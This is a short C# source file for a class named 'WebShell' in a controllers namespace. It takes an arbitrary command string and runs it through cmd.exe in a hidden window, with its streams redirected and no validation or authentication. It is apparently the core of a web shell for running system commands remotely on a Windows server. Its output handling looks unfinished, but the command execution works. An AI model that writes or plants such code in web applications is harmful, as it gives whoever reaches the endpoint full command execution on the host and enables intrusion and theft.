using System.Diagnostics;

namespace WebShell.Controllers;

public class WebShell
{
    public  Process CmdProcess;

    public  void  CommandRequest(string command)
    {
        CmdProcess = new Process();
        CmdProcess.StartInfo = new ProcessStartInfo()
        {
            FileName = "cmd.exe",
            Arguments = @$"/C {command}",
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            RedirectStandardInput = true,
        };
    }

    public bool CheckWrite()
    {
        return CmdProcess.StandardInput.BaseStream.CanWrite;
    }
    public  void Run()
    {
        CmdProcess.Start();
        CmdProcess.BeginOutputReadLine();
        CmdProcess.BeginErrorReadLine();
        CmdProcess.WaitForExitAsync(); 
    }
}